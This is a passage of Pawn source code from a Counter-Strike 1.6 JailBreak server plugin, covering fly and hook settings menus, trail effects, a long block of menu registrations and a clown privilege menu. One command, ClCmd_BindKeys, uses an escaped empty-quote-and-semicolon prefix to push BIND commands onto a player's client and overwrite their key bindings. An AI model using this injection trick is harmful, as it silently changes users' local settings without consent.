		jbe_set_user_rendering( id , kRenderFxGlowShell, random_num(0, 255), random_num(0, 255), random_num(0, 255), kRenderNormal, 200);
	}
	if(g_iModeFly[id]) ///Проверка на режим FLY 
	{
		Fly_task(id+TASK_FLY_PLAYER);
	    set_task(0.1, "Fly_task", id+TASK_FLY_PLAYER, _, _, "b");
		emit_sound(id, CHAN_STATIC, g_szFlySound[g_iFlySound[id]][1], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
	}
	return PLUGIN_HANDLED;
}

public ClCmd_FlyOff(id)
{
    if(g_iModeFly[id])
	{
	    if(task_exists(id+TASK_FLY_PLAYER))
	    remove_task(id+TASK_FLY_PLAYER);
	}
	UTIL_create_killbeam(id);
    emit_sound(id, CHAN_STATIC, g_szFlySound[g_iFlySound[id]][1], VOL_NORM, ATTN_NORM, SND_STOP, PITCH_NORM);
	return PLUGIN_HANDLED;
}

public Fly_task(id)
{
	id -= TASK_FLY_PLAYER;
	new Float:fAim[3], Float:vecVelocity[3];
	VelocityByAim(id, g_iSpeedFly[id], fAim);
	vecVelocity[0] = fAim[0];
	vecVelocity[1] = fAim[1];
	vecVelocity[2] = fAim[2];
	set_pev(id, pev_velocity, vecVelocity);
}

Show_Fly_Speed(id)
{
	new szMenu[512], iKeys = (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<8|1<<9),
	iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_SETTING_FLY_TITLE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\d%L^n", id, "JBE_FLY_INF");
	if(g_iSpeedFly[id] == 1000)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r><^n", id, "JBE_FLY_SPEED_1");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_FLY_SPEED_1");
	if(g_iSpeedFly[id] == 720)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r><^n", id, "JBE_FLY_SPEED_2");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_FLY_SPEED_2");
	if(g_iSpeedFly[id] == 500)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r><^n", id, "JBE_FLY_SPEED_3");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_FLY_SPEED_3");
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\d%L^n", id, "JBE_FLY_INF1");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_FLY_SPRITES", HookEnableTrail[id] ? "\rВыкл" : "\yВкл");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_FLY_SOUND", g_szFlySound[g_iFlySound[id]][0]);
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_Fly_Speed");
	
}

public Handle_Fly_Speed(id, iKey)
{
	switch(iKey)
	{
		case 0: g_iSpeedFly[id] = 1000;
		case 1: g_iSpeedFly[id] = 720;
		case 2: g_iSpeedFly[id] = 500;
		case 3: 
		{
			if(HookEnableTrail[id])
			{
				HookEnableTrail[id] = false;
			}
			else if(!HookEnableTrail[id])
			{
				HookEnableTrail[id] = true;
			}
		}
		case 4: 
		{
			if(g_iFlySound[id] >= (sizeof(g_szFlySound) - 1)) g_iFlySound[id] = 0;
			else g_iFlySound[id]++;
		}
		case 8: return Show_HookMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_Fly_Speed(id);
}

public func_trail(id)
{	
	if( HookEnableTrail[id] )
	{
		message_begin (MSG_BROADCAST,SVC_TEMPENTITY);
		write_byte(TE_BEAMFOLLOW);
		write_short(id);
		write_short(g_pSpriteTrail);
		write_byte(10);
		write_byte(10);
		write_byte(random_num(50,200));
		write_byte(random_num(50,200));
		write_byte(random_num(50,200));
		write_byte(200);
		message_end();
	}
}

public remove_beam(id) 
{
	message_begin( MSG_BROADCAST,SVC_TEMPENTITY );
	write_byte( 99);
	write_short( id );
	message_end();
}

Show_HookMenu(id)
{
	new szMenu[512], iKeys = (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_HOOK_TITLE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1]\w %L^n", id, "JBE_MENU_HOOK_SOUND", g_szHookSound[g_iHookSound[id]][0]);
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2]\w %L^n", id, "JBE_MENU_HOOK_SPRITE", g_szHookSprite[g_iHookSprite[id]][0]);
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3]\w %L^n", id, "JBE_MENU_HOOK_END", g_szHookEnd[g_iHookEnd[id]][0]);
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4]\w %L^n", id, "JBE_MENU_HOOK_SPEED", g_szHookSpeed[g_iHookSpeed[id]][0]);
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5]\w %L^n", id, "JBE_MENU_HOOK_COLOR", g_szHookColor[g_iHookColor[id]][0]);
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6]\w %L^n", id, "JBE_MENU_HOOK_SIZE", g_szHookSize[g_iHookSize[id]][0]);
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7]\w %L^n^n", id, "JBE_MENU_HOOK_TYPE", g_szHookType[g_iHookType[id]][0]);
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsSetBit(g_iBitUserDemon, id))
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[8] \w%L^n", id, "JBE_SETTING_FLY_TITLE");
		iKeys |= (1<<7);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r[Демон]^n", id, "JBE_SETTING_FLY_TITLE");
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9]\w %L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0]\w %L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_HookMenu");
}

public Handle_HookMenu(id, iKey)
{
	switch(iKey)
	{
		case 0: 
		{
			if(g_iHookSound[id] >= (sizeof(g_szHookSound) - 1)) g_iHookSound[id] = 0;
			else g_iHookSound[id]++;
		}
		case 1: 
		{
			if(g_iHookSprite[id] >= (sizeof(g_szHookSprite) - 1)) g_iHookSprite[id] = 0;
			else g_iHookSprite[id]++;
		}
		case 2:
		{
			if(g_iHookEnd[id] >= (sizeof(g_szHookEnd) - 1)) g_iHookEnd[id] = 0;
			else g_iHookEnd[id]++;
		}
		case 3: 
		{
			if(g_iHookSpeed[id] >= (sizeof(g_szHookSpeed) - 1)) g_iHookSpeed[id] = 0;
			else g_iHookSpeed[id]++;
		}
		case 4:
		{
			if(g_iHookColor[id] >= (sizeof(g_szHookColor) - 1)) g_iHookColor[id] = 0;
			else g_iHookColor[id]++;
		}
		case 5:
		{
			if(g_iHookSize[id] >= (sizeof(g_szHookSize) - 1)) g_iHookSize[id] = 0;
			else g_iHookSize[id]++;
		}
		case 6:
		{
			if(g_iHookType[id] >= (sizeof(g_szHookType) - 1)) g_iHookType[id] = 0;
			else g_iHookType[id]++;
		}
		case 7: return Show_Fly_Speed(id);
		case 8: return Show_AdminMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_HookMenu(id);
}

public ClCmd_BindKeys(id) client_cmd(id, "^"^";BIND F3 chooseteam;BIND z radio1;BIND x radio2;BIND c radio3");
/*===== <- Консольные команды <- =====*///}

/*===== -> Меню -> =====*///{
#define PLAYERS_PER_PAGE 8

menu_init()
{
	register_menucmd(register_menuid("Show_ChooseTeamMenu"), (1<<0|1<<1|1<<2|1<<3|1<<8|1<<9), "Handle_ChooseTeamMenu");
	register_menucmd(register_menuid("Show_WeaponsGuardMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<9), "Handle_WeaponsGuardMenu");
    register_menucmd(register_menuid("Show_WeaponsGuardPistolMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_WeaponsGuardPistolMenu");
	register_menucmd(register_menuid("Show_MainPnMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_MainPnMenu");
	register_menucmd(register_menuid("Show_MainGrMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_MainGrMenu");
	register_menucmd(register_menuid("Show_ShopPnMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_ShopPnMenu");
	register_menucmd(register_menuid("Show_MenuShopPn"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_MenuShopPn");
	register_menucmd(register_menuid("Show_MenuShopWeapons"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_MenuShopWeapons");
	register_menucmd(register_menuid("Show_ShopGuardMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<8|1<<9), "Handle_ShopGuardMenu");
	register_menucmd(register_menuid("Show_MoneyTransferMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_MoneyTransferMenu");
	register_menucmd(register_menuid("Show_MoneyAmountMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<7|1<<8|1<<9), "Handle_MoneyAmountMenu");
	register_menucmd(register_menuid("Show_CostumesMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_CostumesMenu");
	register_menucmd(register_menuid("Show_ChiefMenu_1"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_ChiefMenu_1");
	register_menucmd(register_menuid("Show_CountDownMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_CountDownMenu");
	register_menucmd(register_menuid("Show_FreeDayControlMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_FreeDayControlMenu");
	register_menucmd(register_menuid("Show_PunishGuardMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_PunishGuardMenu");
	register_menucmd(register_menuid("Show_TransferChiefMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_TransferChiefMenu");
	register_menucmd(register_menuid("Show_TreatPrisonerMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_TreatPrisonerMenu");
	register_menucmd(register_menuid("Show_TakeWanted"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_TakeWanted");
	register_menucmd(register_menuid("Show_ChiefMenu_2"), (1<<0|1<<1|1<<2|1<<3|1<<8|1<<9), "Handle_ChiefMenu_2");
	register_menucmd(register_menuid("Show_VoiceControlMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_VoiceControlMenu");
	register_menucmd(register_menuid("Show_MiniGameMenu_1"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_MiniGameMenu_1");
	register_menucmd(register_menuid("Show_MiniGameMenu_2"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_MiniGameMenu_2");
	register_menucmd(register_menuid("Show_SoccerMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<8|1<<9), "Handle_SoccerMenu");
	register_menucmd(register_menuid("Show_SoccerTeamMenu"), (1<<0|1<<1|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_SoccerTeamMenu");
	register_menucmd(register_menuid("Show_SoccerScoreMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<8|1<<9), "Handle_SoccerScoreMenu");
	register_menucmd(register_menuid("Show_BoxingMenu"), (1<<0|1<<1|1<<2|1<<3|1<<8|1<<9), "Handle_BoxingMenu");
	register_menucmd(register_menuid("Show_BoxingTeamMenu"), (1<<0|1<<4|1<<5|1<<6|1<<8|1<<9), "Handle_BoxingTeamMenu");
	register_menucmd(register_menuid("Show_KillReasonsMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_KillReasonsMenu");
	register_menucmd(register_menuid("Show_KilledUsersMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_KilledUsersMenu");
	register_menucmd(register_menuid("Show_LastPrisonerMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_LastPrisonerMenu");
	register_menucmd(register_menuid("Show_FreeDayFriend"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_FreeDayFriend");
	register_menucmd(register_menuid("Show_ChoicePrizeMenu"), (1<<0|1<<1|1<<2|1<<8|1<<9), "Handle_ChoicePrizeMenu");
	register_menucmd(register_menuid("Show_ChoiceDuelMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<8|1<<9), "Handle_ChoiceDuelMenu");
	register_menucmd(register_menuid("Show_DuelUsersMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_DuelUsersMenu");
	register_menucmd(register_menuid("Show_DayModeMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_DayModeMenu");
	register_menucmd(register_menuid("Show_VipMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_VipMenu");
	register_menucmd(register_menuid("Show_AdminMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_AdminMenu");
	register_menucmd(register_menuid("Show_PremiumMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_PremiumMenu");
	register_menucmd(register_menuid("Show_EliteMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_EliteMenu");
	register_menucmd(register_menuid("Show_EliteResPl"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_EliteResPl");
	register_menucmd(register_menuid("Show_EliteRespawn"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_EliteRespawn");
	register_menucmd(register_menuid("Show_AlphaMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_AlphaMenu");
	register_menucmd(register_menuid("Show_StrajMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_StrajMenu");
	register_menucmd(register_menuid("Show_SuperSimonMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_SuperSimonMenu");
	register_menucmd(register_menuid("Show_SimonSuperMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_SimonSuperMenu");
	register_menucmd(register_menuid("Show_PrezidentMenu_1"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_PrezidentMenu_1");
	register_menucmd(register_menuid("Show_PrezidentMenu_2"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_PrezidentMenu_2");
	register_menucmd(register_menuid("Show_BlockedGuardMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_BlockedGuardMenu");
	register_menucmd(register_menuid("Show_GiveFdMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_GiveFdMenu");
	register_menucmd(register_menuid("Show_GiveGravMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_GiveGravMenu");
	register_menucmd(register_menuid("Show_GiveFustMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_GiveFustMenu");
	register_menucmd(register_menuid("Show_GiveHealthMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_GiveHealthMenu");
	register_menucmd(register_menuid("Show_PrivilegesMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_PrivilegesMenu");
	register_menucmd(register_menuid("Show_ManageSoundMenu"), (1<<0|1<<1|1<<2|1<<8|1<<9), "Handle_ManageSoundMenu");
	register_menucmd(register_menuid("Show_PortalMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<8|1<<9), "Handle_PortalMenu");
	register_menucmd(register_menuid("Show_PriceMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_PriceMenu");
	register_menucmd(register_menuid("Show_MenuPrice"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_MenuPrice");
	register_menucmd(register_menuid("Show_SMusicMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_SMusicMenu");
	register_menucmd(register_menuid("Show_SvetoforMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_SvetoforMenu");
	register_menucmd(register_menuid("Show_ChickenMenu"), (1<<0|1<<1|1<<2|1<<8|1<<9), "Handle_ChickenMenu");
	register_menucmd(register_menuid("Show_SpawnPlayerMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_SpawnPlayerMenu");
	register_menucmd(register_menuid("Show_DeltaMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_DeltaMenu");
	register_menucmd(register_menuid("Show_DyavolMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_DyavolMenu");
	register_menucmd(register_menuid("Show_DemonMenu_1"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_DemonMenu_1");
	register_menucmd(register_menuid("Show_DemonMenu_2"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_DemonMenu_2");
	register_menucmd(register_menuid("Show_PrivilegesTwo"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_PrivilegesTwo");
	register_menucmd(register_menuid("Show_BuildMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_BuildMenu");
	register_menucmd(register_menuid("Show_SpleefMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<8|1<<9), "Handle_SpleefMenu");
	register_menucmd(register_menuid("Show_Fly_Speed"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_Fly_Speed");
	register_menucmd(register_menuid("Show_HookMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_HookMenu");
	register_menucmd(register_menuid("Show_CuffMenu_1"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_CuffMenu_1");
    register_menucmd(register_menuid("Show_CuffList_1"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_CuffList_1");
	register_menucmd(register_menuid("Show_Colorsmenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_colorsmenu");	
	register_menucmd(register_menuid("Show_MarkerMenu"), (1<<0|1<<1|1<<2|1<<2|1<<8|1<<9), "Handle_MarkerMenu");		
	register_menucmd(register_menuid("Show_OvsyankaKrut"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_OvsyankaKrut");	
	register_menucmd(register_menuid("Show_MoneyGive"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_MoneyGive");    
	register_menucmd(register_menuid("Show_MafiaTimer"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_MafiaTimer");
	register_menucmd(register_menuid("Show_MafiaMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_MafiaMenu");
	register_menucmd(register_menuid("Show_PlayerMafia"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_PlayerMafia");
	register_menucmd(register_menuid("Show_MafiaRoley"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_MafiaRoley");
	register_menucmd(register_menuid("Show_PlayerKomissar"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_PlayerKomissar");
	register_menucmd(register_menuid("Show_PlayerDoctor"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_PlayerDoctor");
	register_menucmd(register_menuid("Show_PlayerManyak"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_PlayerManyak");
	register_menucmd(register_menuid("Show_PlayerShluxa"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_PlayerShluxa");
	register_menucmd(register_menuid("Show_RoleyName"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_RoleyName");
	register_menucmd(register_menuid("Show_MadnessMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_MadnessMenu");
	register_menucmd(register_menuid("Show_ClounMenu"), (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), "Handle_ClounMenu");
//	jbe_info_ip(IPLOCK);
}

Show_ClounMenu(id)
{
    new szMenu[512], iKeys = (1<<4|1<<8|1<<9), iAlive = IsSetBit(g_iBitUserAlive, id), iLen;
    iLen = formatex(szMenu, charsmax(szMenu), "Клоун :)^n^n");
    if(!iAlive && !g_szWantedNames[0])
    {
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \wВозродиться \y:P^n");
        iKeys |= (1<<0);
    }
    else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dВозродиться \r:P^n");
	if(iAlive && g_iClounData[id][SKIN_CLOUN] >= g_iAllCvars[CLOUN_SKIN_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \wВзять скин \y~_~^n");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dВзять скин \d[\rчрз %d рнд\d]^n", g_iAllCvars[CLOUN_SKIN_ROUND]);
	if(iAlive && g_iClounData[id][MOLOT] >= g_iAllCvars[CLOUN_MOLOT_ROUND] && jbe_get_user_team(id) == 1)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \wМолоточек \y=0^n");
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \dМолоточек \d[\rчрз %d рнд\d]^n", g_iAllCvars[CLOUN_MOLOT_ROUND]);
	if(iAlive && g_iClounData[id][PUKAN] >= g_iAllCvars[CLOUN_PUKAN_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \wПердануть \r:Q^n");
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dПердануть \d[\rчрз %d рнд\d]^n", g_iAllCvars[CLOUN_PUKAN_ROUND]);
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \wКрутануть башку \r:D^n");
	if(iAlive && g_iClounData[id][PISS] >= g_iAllCvars[CLOUN_PISS_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \wГраната-тыква \yX.X^n");
		iKeys |= (1<<5);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dГраната-тыква \d[\rчрз %d рнд\d]^n", g_iAllCvars[CLOUN_PISS_ROUND]);
	if(iAlive && g_iClounData[id][CMEX] >= g_iAllCvars[CLOUN_CMEX_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \wВеселье \y:B^n");
		iKeys |= (1<<6);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dВеселье \d[\rчрз %d рнд\d]^n", g_iAllCvars[CLOUN_CMEX_ROUND]);
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_ClounMenu");
}

public Handle_ClounMenu(id, iKey)
{
    if(g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;

	new szName[32];
	get_user_name(id, szName, charsmax(szName));
	
	switch(iKey)
	{
		case 0:
        {
		    if(IsNotSetBit(g_iBitUserAlive, id))
		    {
                ExecuteHamB(Ham_CS_RoundRespawn, id);
			    UTIL_SayText(0, "%L Клоун !g%s !tвышел из мёртвых", LANG_PLAYER, "JBE_PREFIX", szName);
				UTIL_SendAudio(0, _, g_szSounds[PRIV_RES]);
			}
        }
		case 1:
        {
			jbe_set_user_model(id, g_szPlayerModel[CLOUNES]);
            g_iClounData[id][SKIN_CLOUN] = 0;
            UTIL_SayText(0, "%L Клоун !g%s !tстал !gклоуном !t:)", LANG_PLAYER, "JBE_PREFIX", szName);
        }
		case 2:
        {
			ClearBit(g_iBitSharpening, id);
			ClearBit(g_iBitBalisong, id);
			ClearBit(g_iBitMachete, id);
			ClearBit(g_iBitSerp, id);
            SetBit(g_iBitScrewdriver, id);
            g_iClounData[id][MOLOT] = 0;
            UTIL_SayText(0, "%L Клоун !g%s !tвзял !gмолоточек", LANG_PLAYER, "JBE_PREFIX", szName);
		    UTIL_SayText(id, "%L %L", id, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_SHOP_WEAPON_HELP");
        }
		case 3:
        {
			effect_Pukan_free(id);
            g_iClounData[id][PUKAN] = 0;
            UTIL_SayText(0, "%L Клоун !g%s !tупс !gперданул !t:3", LANG_PLAYER, "JBE_PREFIX", szName);
        }
		case 4:
		{
		    set_pev(id, pev_punchangle, {400.0, 999.0, 400.0});
            UTIL_ScreenFade(id, (1<<13), (1<<13), 0, 255, 165, 255, 155);
			UTIL_SayText(0, "%L Клоун !g%s !tкрутанул себе !gбашку !t:|", LANG_PLAYER, "JBE_PREFIX", szName);
		} 
		case 5: 
		{
		    Set_Weapon_Pumpkin(id);
			g_iClounData[id][PISS] = 0;
			UTIL_SayText(0, "%L Клоун !g%s !tвзял !gгранату-тыкву", LANG_PLAYER, "JBE_PREFIX", szName);
		}
		case 6: 
		{
		    UTIL_SendAudio(0, _, g_szSounds[CLOUN_CMEX]);
			g_iClounData[id][CMEX] = 0;
			UTIL_SayText(0, "%L Клоун !g%s !tстал !gдико смеяться", LANG_PLAYER, "JBE_PREFIX", szName);
		
		}
		case 8: return Show_PrivilegesMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_ClounMenu(id);
}

